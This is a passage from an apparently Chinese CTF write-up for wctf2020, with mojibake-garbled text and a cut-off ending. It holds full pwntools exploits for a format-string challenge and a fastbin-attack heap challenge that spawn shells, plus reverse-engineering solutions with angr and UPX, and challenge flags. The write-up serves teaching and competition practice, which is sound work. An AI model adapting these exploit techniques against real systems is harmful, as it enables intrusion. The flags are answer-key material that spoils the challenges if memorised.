class="hljs-number">0xd8</span><br>   <span class="hljs-number">0x7f8f4b0c48a0</span> &lt;printf+<span class="hljs-number">160</span>&gt;    <span class="hljs-keyword">ret</span>    <br> <br>   <span class="hljs-number">0x7f8f4b0c48a1</span>                 <span class="hljs-keyword">nop</span>    <span class="hljs-built_in">word</span> <span class="hljs-built_in">ptr</span> <span class="hljs-built_in">cs</span>:[<span class="hljs-built_in">rax</span> + <span class="hljs-built_in">rax</span>]<br>.....................................................................<br>pwndbg&gt; telescope <span class="hljs-number">0x7f8f4b0c4891</span>+<span class="hljs-number">0x36e6bf</span><br><span class="hljs-number">00</span>:<span class="hljs-number">0000</span>â”‚   <span class="hljs-number">0x7f8f4b432f50</span> â€”â–¸ <span class="hljs-number">0x558030d75020</span> â€”â–¸ <span class="hljs-number">0x7f8f4b434620</span> (_IO_2_1_stdout_) â—‚â€” <span class="hljs-number">0xfbad2887</span><br>pwndbg&gt; vmmap<br><span class="hljs-symbol">LEGEND:</span> STACK | HEAP | CODE | DATA | RWX | RODATA<br>    <span class="hljs-number">0x558030b73000</span>     <span class="hljs-number">0x558030b75000</span> r-xp     <span class="hljs-number">2000</span> <span class="hljs-number">0</span>      /mnt/hgfs/shared/challenge/dididada/dididada<br>    <span class="hljs-number">0x558030d74000</span>     <span class="hljs-number">0x558030d75000</span> r--p     <span class="hljs-number">1000</span> <span class="hljs-number">1000</span>   /mnt/hgfs/shared/challenge/dididada/dididada<br>    <span class="hljs-number">0x558030d75000</span>     <span class="hljs-number">0x558030d76000</span> rw-p     <span class="hljs-number">1000</span> <span class="hljs-number">2000</span>   /mnt/hgfs/shared/challenge/dididada/dididada<br><br></code></pre></td></tr></table></figure><p>æ ¹æ®è°ƒè¯•å¯ä»¥çœ‹åˆ°ï¼Œæœ¬æ¥<code>printf</code>æ˜¯å–<code>stdout</code>çš„ï¼Œè¾“å‡ºæµå˜›ï¼Œä½†æ˜¯å¦‚æœæˆ‘ä»¬æŠŠ<code>.bss</code>å‡ºçš„<code>stdout</code>æŒ‡é’ˆæ”¹ä¸ºæŒ‡å‘<code>stderr</code>ï¼Œé‚£<code>close(1)</code>ï¼Œæ˜¯ä¸æ˜¯å°±æ²¡é—®å•¥é—®é¢˜äº†ï¼Œåæ­£<code>stderr</code>çš„<code>fileno</code>æ˜¯2ï¼Œè€Œä¸”<code>stdout</code>å’Œ<code>stderr</code>åœ°å€å¾ˆæ¥è¿‘ï¼š</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs crystal">pwndbg&gt; p stdout<br><span class="hljs-variable">$1</span> = (<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">_IO_FILE</span> *) 0<span class="hljs-title">x7f8f4b434620</span> &lt;<span class="hljs-title">_IO_2_1_stdout_</span>&gt;</span><br>pwndbg&gt; p stderr<br><span class="hljs-variable">$2</span> = (<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">_IO_FILE</span> *) 0<span class="hljs-title">x7f8f4b434540</span> &lt;<span class="hljs-title">_IO_2_1_stderr_</span>&gt;</span><br></code></pre></td></tr></table></figure><p>ç»¼ä¸Šï¼Œå¾—åˆ°æ€è·¯ä¸ºï¼š</p><ul><li>ask_timeæ³„éœ²ç¨‹åºåŸºåœ°å€</li><li>leakæ³„éœ²<code>stderr</code>çš„ç¬¬äºŒä¸ªå­—èŠ‚ï¼Œï¼ˆä¸ºäº†æ¶ˆé™¤é‚£1&#x2F;16çš„æ¦‚ç‡</li><li>fmt_attackï¼ŒæŠŠsecretç¬¬ä¸€ä¸ªå­—èŠ‚æ”¹ä¸º<code>\x00</code>ï¼Œåœ¨æŠŠbssæ®µé‡Œçš„<code>stdout</code>æ”¹ä¸ºæŒ‡å‘<code>stderr</code></li></ul><p>æœ€ç»ˆexpä¸ºï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta"># usage: python exp.py REMOTE=x.x.x.x</span><br>from pwn import *<br><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><br>def debug(addr,PIE=True):<br><span class="hljs-keyword">if</span> PIE:<br>text_base = <span class="hljs-type">int</span>(os.popen(<span class="hljs-string">&quot;pmap &#123;&#125;| awk &#x27;&#123;&#123;print $1&#125;&#125;&#x27;&quot;</span>.format(p.pid)).readlines()[<span class="hljs-number">1</span>], <span class="hljs-number">16</span>)<br>gdb.attach(p,<span class="hljs-string">&#x27;b *&#123;&#125;&#x27;</span>.format(hex(text_base+addr)))<br><span class="hljs-keyword">else</span>:<br>gdb.attach(p,<span class="hljs-string">&quot;b *&#123;&#125;&quot;</span>.format(hex(addr)))<br><br>def cmd(command):<br>p.recvuntil(<span class="hljs-string">&quot;&gt;&gt;&quot;</span>)<br>p.sendline(str(command))<br><br>def main(host,port=<span class="hljs-number">16253</span>):<br>global p<br><span class="hljs-keyword">if</span> host:<br>p = remote(host,port)<br><span class="hljs-keyword">else</span>:<br>p = process(<span class="hljs-string">&quot;./dididada&quot;</span>)<br><span class="hljs-meta"># gdb.attach(p)</span><br>debug(<span class="hljs-number">0x000000000000ECC</span>)<br>p.recvuntil(<span class="hljs-string">&quot;me the time:&quot;</span>)<br>p.send(<span class="hljs-string">&quot;+\n+\n+\n&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br>elf_base = <span class="hljs-type">int</span>(p.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)[:<span class="hljs-number">-1</span>]) - <span class="hljs-number">0xbd5</span><br>info(<span class="hljs-string">&quot;elf : &quot;</span> + hex(elf_base))<br><span class="hljs-meta">#leak stdout</span><br>cmd(<span class="hljs-number">1</span>)<br>p.send(p64(elf_base+<span class="hljs-number">0x000000000202041</span>))<br><span class="hljs-built_in">stderr</span> = (ord(p.recv(<span class="hljs-number">1</span>))&lt;&lt;<span class="hljs-number">8</span>)|<span class="hljs-number">0x40</span><br><span class="hljs-meta">#fmt attack</span><br>cmd(<span class="hljs-number">2</span>)<br>payload = <span class="hljs-string">&quot;%11$hn%&#123;&#125;c%12$hn&quot;</span>.format(<span class="hljs-built_in">stderr</span>)<br>payload = payload.ljust(<span class="hljs-number">0x18</span>,<span class="hljs-string">&quot;+&quot;</span>)+p64(elf_base+<span class="hljs-number">0x000000000202060</span>)<br>payload += p64(elf_base+<span class="hljs-number">0x202020</span>)<br><br>p.send(payload)<br>cmd(<span class="hljs-number">3</span>)<br>p.send(<span class="hljs-string">&quot;\x00&quot;</span>*<span class="hljs-number">0x40</span>)<br>p.interactive()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>main(args[<span class="hljs-string">&#x27;REMOTE&#x27;</span>])<br></code></pre></td></tr></table></figure><h2 id="easyfast-2-solves"><a href="#easyfast-2-solves" class="headerlink" title="easyfast - 2 solves"></a>easyfast - 2 solves</h2><blockquote><p>Author: ColdShield</p></blockquote><p>flag:<code>wctf2020&#123;THE_MOST_EASY_FASTBINATTACK&#125;</code></p><p>é¢„æœŸæ˜¯æœ€ç®€å•çš„fastbin attackï¼ˆä½†æ˜¯å‡ºé¢˜æ˜¯åœ¨æ¯”èµ›å‰å¤•è¡¥ä¸Šçš„ä¸€é“ï¼Œç²—å¿ƒæ²¡ç»™ä¸‹æ ‡åšæ£€æŸ¥å¯¼è‡´å’Œå‰é¢çš„é¢˜å˜æˆä¸€ä¸ªæ€§è´¨äº†â€¦ï¼‰</p><p>ç¨‹åºåªèƒ½mallocä¸‰æ¬¡ï¼Œè€Œä¸”ä¸‰æ¬¡éƒ½åªèƒ½æ˜¯fast chunkï¼Œfreeçš„æ—¶å€™æ²¡æœ‰æ£€æŸ¥æŒ‡é’ˆä¹Ÿæ²¡æœ‰å¯¹æŒ‡é’ˆæ¸…é›¶ï¼ŒModifyä¹Ÿæ˜¯ç›´æ¥read 8ä¸ªå­—èŠ‚ï¼Œæ²¡æœ‰å¤šä½™æ£€æŸ¥</p><p>ç¨‹åºgetshellåªéœ€è¦æ»¡è¶³dataæ®µçš„å˜é‡ä¸º0å³å¯ï¼Œç„¶ååœ¨dataæ®µä¸Šæœ‰ä¸€ä¸ª0x50çš„fakesize</p><p><img src="https://s1.ax1x.com/2020/03/30/GnjA6U.png" alt="GnjA6U.png"></p><p>æ‰€ä»¥æ€è·¯å°±æ˜¯ </p><p><code>malloc(0x48)-&gt;free(array[0])-&gt;modify(array[0],p64(&amp;fakesize-8))</code></p><p><code>-&gt;malloc(0x48)-&gt;malloc(0x48)-&gt;modify(array[0],p64(0))</code></p><p><strong>exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> __future__ <span class="hljs-keyword">import</span> print_function<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>binary = <span class="hljs-string">&#x27;./easyheap&#x27;</span><span class="hljs-comment">#binary&#x27;s name here</span><br>context.binary = binary<span class="hljs-comment">#context here</span><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>pty = process.PTY<br>p = process(binary, aslr = <span class="hljs-number">1</span>, stdin=pty, stdout=pty)<span class="hljs-comment">#process option here</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">Host =&#x27;101.200.53.102&#x27;</span><br><span class="hljs-string">Port =22222</span><br><span class="hljs-string">p = remote(Host,Port)</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>elf = ELF(binary)<br>libc = elf.libc<br><br>my_u64 = <span class="hljs-keyword">lambda</span> x: u64(x.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>))<br>my_u32 = <span class="hljs-keyword">lambda</span> x: u32(x.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>))<br>global_max_fast=<span class="hljs-number">0x3c67f8</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">loginfo</span>(<span class="hljs-params">what=<span class="hljs-string">&#x27;&#x27;</span>,address=<span class="hljs-number">0</span></span>):<br>log.info(<span class="hljs-string">&quot;\033[1;36m&quot;</span> + what + <span class="hljs-string">&#x27;-----&gt;&#x27;</span> + <span class="hljs-built_in">hex</span>(address) + <span class="hljs-string">&quot;\033[0m&quot;</span>)<br><br><span class="hljs-comment"># todo here</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Alloc</span>(<span class="hljs-params">size</span>):<br>p.recvuntil(<span class="hljs-string">&quot;choice&gt;\n&quot;</span>)<br>p.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;size&gt;\n&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Free</span>(<span class="hljs-params">index</span>):<br>p.recvuntil(<span class="hljs-string">&quot;choice&gt;\n&quot;</span>)<br>p.sendline(<span class="hljs-string">&quot;2&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;index&gt;\n&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Modify</span>(<span class="hljs-params">index,content</span>):<br>p.recvuntil(<span class="hljs-string">&quot;choice&gt;\n&quot;</span>)<br>p.sendline(<span class="hljs-string">&quot;3&quot;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;index&gt;\n&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(index))<br>p.send(content)<br><br>Alloc(<span class="hljs-number">0x48</span>)<br>Free(<span class="hljs-number">0</span>)<br>Modify(<span class="hljs-number">0</span>,p64(<span class="hljs-number">0x602080</span>))<br>Alloc(<span class="hljs-number">0X48</span>)<br>Alloc(<span class="hljs-number">0X48</span>)<br>Modify(<span class="hljs-number">2</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="Cr0ssFun-42-solves"><a href="#Cr0ssFun-42-solves" class="headerlink" title="Cr0ssFun - 42 solves"></a>Cr0ssFun - 42 solves</h2><blockquote><p>Author: 52HeRtz</p></blockquote><p>å‡ºè¿™é¢˜çš„å‰å‡ å¤©ï¼Œåˆšå¥½å»ä¿„ç½—æ–¯ä¸€ä¸ªæ¯”èµ›ç§äº†ä¸€çœ¼ï¼Œå‘ç°æœ‰ä¸ªè¿™æ ·çš„é¢˜ï¼Œå·®ç‚¹æ²¡æŠŠæˆ‘æ°”æ­»ï¼Œäºæ˜¯æˆ‘å°±å·®ä¸å¤šçš„å†å‡ºäº†ä¸€ä¸ªç±»ä¼¼çš„é¢˜hhhhhã€‚ã€‚ã€‚</p><p>ä¸¢è¿› IDAï¼Œå¯ä»¥çœ‹è§ä¸€å †å‡½æ•°</p><p><img src="https://s1.ax1x.com/2020/03/30/GnXfyD.png" alt="GnXfyD.png"></p><p>å¯ä»¥çœ‹è§ä¸€ä¸ªcheckå‡½æ•°ï¼Œæ‹¼å‘½çš„è°ƒç”¨å…¶å®ƒå‡½æ•°</p><p><img src="https://s1.ax1x.com/2020/03/30/GnXWQO.png" alt="GnXWQO.png"></p><p><img src="https://s1.ax1x.com/2020/03/30/GnXhOe.png" alt="GnXhOe.png"></p><p>æ¥ä¸‹æ¥å°±æ˜¯ä¸æ–­åœ°å¥—å¨ƒï¼Œå…¶å®å°±æŠŠæ‰€æœ‰çš„å­—ç¬¦éƒ½å¼„å‡ºæ¥å°±å¯ä»¥äº†ï¼Œæ‰‹åŠ¨æˆ–è€…å†™è„šæœ¬éƒ½å¯ä»¥ã€‚</p><p>å½“ç„¶å‡ºé¢˜äººä½œä¸ºä¸€ä¸ªå¾ˆæ‡’çš„webç‹—ï¼Œå½“ç„¶æ˜¯å–œæ¬¢ç”¨å·¥å…·ï¼Œå¯ä»¥ç”¨ angr æ±‚è§£ã€‚</p><p>çœ‹èµ·æ¥è¾“å…¥æ­£ç¡®çš„ flag åä¼šæ‰“å° <code>Your flag is correct, go and submit it!</code></p><p>ç”¨ angr æ±‚è§£ä»€ä¹ˆæ ·çš„è¾“å…¥å¯ä»¥ä½¿å¾—ç¨‹åºè¾“å‡º <code>Your flag is correct, go and submit it!</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br>proj = angr.Project(<span class="hljs-string">&quot;Cr0ssfun&quot;</span>)<br>simgr = proj.factory.simgr()<br>simgr.explore(find=<span class="hljs-keyword">lambda</span> s: <span class="hljs-string">b&quot;Your flag is correct, go and submit it!&quot;</span> <span class="hljs-keyword">in</span> s.posix.dumps(<span class="hljs-number">1</span>))<br><span class="hljs-built_in">print</span>(simgr.found[<span class="hljs-number">0</span>].posix.dumps(<span class="hljs-number">0</span>))<br></code></pre></td></tr></table></figure><p>ç­‰å‡ ç§’å°±å‡ºæ¥äº†</p><p><img src="https://s1.ax1x.com/2020/03/30/GnX5eH.jpg" alt="GnX5eH.jpg"></p><h2 id="level1-30-solves"><a href="#level1-30-solves" class="headerlink" title="level1 - 30 solves"></a>level1 - 30 solves</h2><blockquote><p>Author: ColdShield</p></blockquote><p>flag:<code>wctf2020&#123;d9-dE6-20c&#125;</code></p><p><img src="https://s1.ax1x.com/2020/03/30/GnR5ZD.png" alt="GnR5ZD.png"></p><p>ç¨‹åºæµç¨‹çš„æ„æ€å°±æ˜¯ï¼š</p><ol><li>ä»flagè¿™ä¸ªæ–‡ä»¶ä¸­è¯»å‡ºäº†é•¿åº¦ä¸º0x14çš„å­—ç¬¦ä¸²åˆ°ptræŒ‡å‘çš„åœ°æ–¹å»</li><li>ä»1å¼€å§‹åˆ°0x13ï¼Œå¾ªç¯ï¼Œiä¸ºå¥‡æ•°æ—¶è¾“å‡º<code>ptr[i]&lt;&lt;i</code>ï¼Œiä¸ºå¶æ•°æ—¶è¾“å‡º<code>i*ptr[i]</code>ï¼Œæ ¼å¼éƒ½æ˜¯<code>%ld</code></li></ol><p>ç„¶åç¨‹åºç»™å‡ºäº†ä¸€ä¸ª<code>output.txt</code></p><p>æ ¹æ®outputé€†æ¨å‡ºflagå³å¯ï¼Œè¿™é‡Œç»™ä¸€ä¸ªå†™çš„å¾ˆç®€é™‹çš„pyç¨‹åºä¾›å‚è€ƒ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;output.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    i=<span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">if</span> i%<span class="hljs-number">2</span>==<span class="hljs-number">0</span>:<br>            num=<span class="hljs-built_in">int</span>(f.readline().strip(<span class="hljs-string">&#x27;\n&#x27;</span>))<br>            <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(num/i)),end=<span class="hljs-string">&quot;&quot;</span>),<br>        <span class="hljs-keyword">else</span>:<br>            num=<span class="hljs-built_in">int</span>(f.readline().strip(<span class="hljs-string">&#x27;\n&#x27;</span>))<br>            <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(num&gt;&gt;i),end=<span class="hljs-string">&quot;&quot;</span>),<br>        i+=<span class="hljs-number">1</span><br>        <span class="hljs-keyword">if</span> i==<span class="hljs-number">0x14</span> :<br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><p>å½“ç„¶å› ä¸ºç¨‹åºæ²¡æœ‰è¾“å‡º<code>ptr[0]</code>çš„å†…å®¹ï¼Œæ‰€ä»¥æ ¹æ®<code>wctf2020&#123;&#125;</code>çš„æ ¼å¼è¡¥ä¸Š<code>w</code>å°±å¯ä»¥äº†</p><h2 id="level2-24-solves"><a href="#level2-24-solves" class="headerlink" title="level2 - 24 solves"></a>level2 - 24 solves</h2><blockquote><p>Author: ColdShield</p></blockquote><p>flag:<code>wctf2020&#123;Just_upx_-d&#125;</code></p><p>ç¨‹åºè¿è¡Œå¼¹<code>where is it?</code></p><p>ç„¶åä¸¢è¿›IDAå‘ç°å•¥éƒ½æ²¡æœ‰ï¼Œè¿™ç§å•¥éƒ½æ²¡æœ‰çš„ç¨‹åºå°±æ˜¯å¾ˆæ˜æ˜¾åŠ å£³çš„ç¨‹åº</p><p><img src="https://s1.ax1x.com/2020/03/30/Gn02Bn.png" alt="Gn02Bn.png"></p><p>ç”¨Detect It EasyæŸ¥å£³ï¼ŒUPX 3.95å‹ç¼©å£³</p><p><img src="https://s1.ax1x.com/2020/03/30/Gn06Xj.png" alt="Gn06Xj.png"></p><p>ç„¶åç›´æ¥ç”¨upxå¯¹åº”ç‰ˆæœ¬çš„å·¥å…·è„±å£³å°±å¥½äº†ï¼š<a href="https://github.com/upx/upx/tags">https://github.com/upx/upx/tags</a></p><p>å†ä¸¢è¿›IDAå°±èƒ½çœ‹åˆ°flag</p><p><img src="https://s1.ax1x.com/2020/03/30/Gn0fA0.png" alt="Gn0fA0.png"></p><h2 id="level3-26-solves"><a href="#level3-26-solves" class="headerlink" title="level3 - 26 solves"></a>level3 - 26 solves</h2><blockquote><p>Author: ColdShield</p></blockquote><p>flag:<code>wctf2020&#123;Base64_is_the_start_of_reverse&#125;</code></p><p><img src="https://s1.ax1x.com/2020/03/30/Gn0hNV.png" alt="Gn0hNV.png"></p><p>ç¨å¾®çœ‹ä¸€ä¸‹ï¼Œmainç¨‹åºçš„æ„æ€å°±æ˜¯è¾“å…¥ä¸€ä¸²å­—ç¬¦ä¸²ï¼Œéšæœºå»æ‰§è¡Œä¸¤ä¸ªåˆ†æ”¯ï¼Œä¸€ä¸ªåˆ†æ”¯æ˜¯ç”¨<code>base64_encode</code>ç¼–ç ä¹‹åè¾“å‡ºç¼–ç åçš„å†…å®¹ï¼Œå¦å¤–ä¸€ä¸ªåˆ†æ”¯å°±æ˜¯é‚£äº›å­—ç¬¦ä¸²ï¼Œå¾ˆæ˜æ˜¾å°±æ˜¯è¦è§£è¿™ä¸€ä¸²<code>d2G0ZjLwHjS7DmOzZAY0X2lzX3CoZV9zdNOydO9vZl9yZXZlcnGlfD==</code>çš„ç </p><p>ä½†æ˜¯ç›´æ¥è§£å°±ä¼šæ˜¯è¿™æ ·ï¼š</p><p><img src="https://s1.ax1x.com/2020/03/30/Gn0ycQ.png" alt="Gn0ycQ.png"></p><p>å°±æ˜¯ç¨‹åºè¯´çš„<code>different from the standard</code></p><p>ä¸€èˆ¬CTFç¢°åˆ°è¿™ç§æƒ…å†µï¼Œè¦ä¹ˆæ˜¯<code>base64_encode</code>ä¸­çš„ç¼–ç ç®—æ³•å‡ºäº†é—®é¢˜ï¼Œè¦ä¹ˆæ˜¯base64çš„ç¼–ç tableå‡ºäº†é—®é¢˜ã€‚æ˜¾ç„¶åˆ†æå‰è€…ä¼šæ¯”è¾ƒéº»çƒ¦ï¼Œæ‰€ä»¥å…ˆçœ‹çœ‹table</p><p><img src="https://s1.ax1x.com/2020/03/30/Gn0o3F.png" alt="Gn0o3F.png"></p><p>IDAé‡Œé¢çœ‹ä¸Šå»tableæ˜¯æ­£å¸¸çš„ï¼Œä½†æ˜¯æ³¨æ„ä¸€ä¸‹å³è¾¹çš„å¼•ç”¨æ•°æ˜¯æ²¡æœ‰æ˜¾ç¤ºå®Œçš„ï¼Œåé¢è¿˜æœ‰<code>...</code></p><p>è¿™ä¸ªæ—¶å€™å¯ä»¥å¼€IDAçš„<code>Options-&gt;general</code>æ‰¾åˆ°<code>Cross-references</code>ä¸‹çš„<code>Disassembly(non-graph)</code>ï¼ŒæŠŠè¿™ä¸ªæ•°å€¼æ”¹å¤§ä¸€ç‚¹</p><p><img src="https://s1.ax1x.com/2020/03/30/Gn07jJ.png" alt="Gn07jJ.png"></p><p>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬çš„<code>base64_table</code>è¿˜åœ¨å¦å¤–ä¸€ä¸ª<code>O_OLookAtYou</code>çš„å‡½æ•°é‡Œé¢è¢«å¼•ç”¨äº†</p><p>psï¼šEmmmmmâ€¦æ€ä¹ˆè¯´å‘¢ï¼Œå‡ºè¿™ä¸ªé¢˜çš„æ„æ€å°±æ˜¯æƒ³è®©ä½ ä»¬å­¦ä¼šçœ‹æ•°æ®å¼•ç”¨&amp;å‘ç°ä¸€äº›ç¨‹åºä¸­çœ‹èµ·æ¥å¥‡æ€ªçš„å‡½æ•°åï¼Œæ¯”å¦‚è¿™ä¸ªé¢˜ç›®çš„è¯ï¼Œå¦‚æœä¸€ä¸Šæ¥å°±çœ‹åˆ°äº†è¿™ä¸ª<code>O_OLookAtYou</code>å°±è‚¯å®šä¼šç‚¹è¿›å»çœ‹ä¸€çœ‹ï¼Œå°±ä¼šçŸ¥é“base64_tableè¢«æ”¹è¿‡äº†ï¼Œä¹Ÿå°±çŸ¥é“base64ç¼–ç å‡ºé—®é¢˜å¤šåŠæ˜¯å› ä¸ºtableè€Œä¸æ˜¯ç®—æ³•å‡ºé—®é¢˜(èŠ‚çœåˆ†æçš„æ—¶é—´)ï¼Œè™½ç„¶è¯´ä»mainçš„å‡½æ•°è°ƒç”¨é‡Œé¢æ˜¯çœ‹ä¸åˆ°è¿™ä¸ªå‡½æ•°çš„(å¦‚ä¸‹å›¾<code>Xfers graph from</code>)</p><p><img src="https://s1.ax1x.com/2020/03/30/GnWRYj.png" alt="GnWRYj.png"></p><p>å› ä¸ºè¿™ä¸ªå‡½æ•°çš„å‡½æ•°æŒ‡é’ˆè¢«æ”¾åœ¨äº†ELFä¸­mainå‡½æ•°æ‰§è¡Œä¹‹å‰çš„åˆå§‹åŒ–æ®µ<code>_init_array</code>ï¼Œåœ¨æ‰§è¡Œmainå‡½æ•°ä¹‹å‰è¿™ä¸ªå‡½æ•°å°±è¢«è°ƒç”¨äº†ï¼ˆlinuxä¸‹ç”¨gccç¼–è¯‘ä¹‹å‰åœ¨å‡½æ•°å£°æ˜å‰é¢åŠ ä¸Š<code>__attribute__((constructor))</code>ï¼‰</p><p><img src="https://s1.ax1x.com/2020/03/30/GnWIXV.png" alt="GnWIXV.png"></p><p>è¿™ä¸ªå‡½æ•°å°±æ˜¯æŠŠ<code>base64_table</code>ä¸­å‰é¢ä¸‹æ ‡0-9å¤„çš„åä¸ªå­—ç¬¦ï¼Œå’Œåé¢çš„ä¸‹æ ‡19~10å¤„çš„åä¸ªå­—ç¬¦äº’ç›¸è°ƒæ¢äº†ä¸€ä¸‹</p><p>ä¸‹é¢å°±æ˜¯æ ¹æ®æ–°çš„<code>base64_table</code>è§£åˆšå¼€å§‹çš„é‚£ä¸²ç äº†ï¼Œè¿™é‡Œä¸å†èµ˜è¿°</p><h2 id="level4-12-solves"><a href="#level4-12-solves" class="headerlink" title="level4 - 12 solves"></a>level4 - 12 solves</h2><blockquote><p>Author: ColdShield</p></blockquote><p>flag:<code>wctf2020&#123;This_IS_A_7reE&#125;</code></p><p><img src="https://s1.ax1x.com/2020/03/30/GnWTmT.png" alt="GnWTmT.png"></p><p>ç›´æ¥è¿è¡Œçš„è¯ç¨‹åºæ˜¯è¾“å‡ºè¿™ä¸ªï¼Œå­¦è¿‡æ•°æ®ç»“æ„çš„åº”è¯¥èƒ½å¾ˆæ˜æ˜¾åœ°çœ‹åˆ°è¿™æ˜¯åœ¨éå†ä»€ä¹ˆä¸œè¥¿ï¼Œ(<code>*left</code>ï¼Œ<code>*right</code>ï¼šäºŒå‰æ ‘)</p><p>ç„¶åç»™äº†ä¸¤ç§éå†æ–¹å¼å‡ºæ¥çš„å­—ç¬¦ä¸²ï¼Œç¬¬ä¸‰ç§æ˜¯æ˜¾ç¤º<code>No way</code>ï¼Œæ‰€ä»¥flagè‚¯å®šå°±æ˜¯ç¬¬ä¸‰ç§éå†æ–¹å¼éå†å‡ºæ¥çš„äº†ï¼Œå†æ¥åˆ†æ</p><p><strong>init</strong></p><p><img src="https://s1.ax1x.com/2020/03/30/GnWqk4.png" alt="GnWqk4.png"></p><p>é¦–å…ˆçœ‹åˆ°<code>init</code>å‡½æ•°é‡Œé¢åšçš„æ˜¯ä¸€å †åˆå§‹åŒ–çš„æµç¨‹ï¼Œè¿™æ 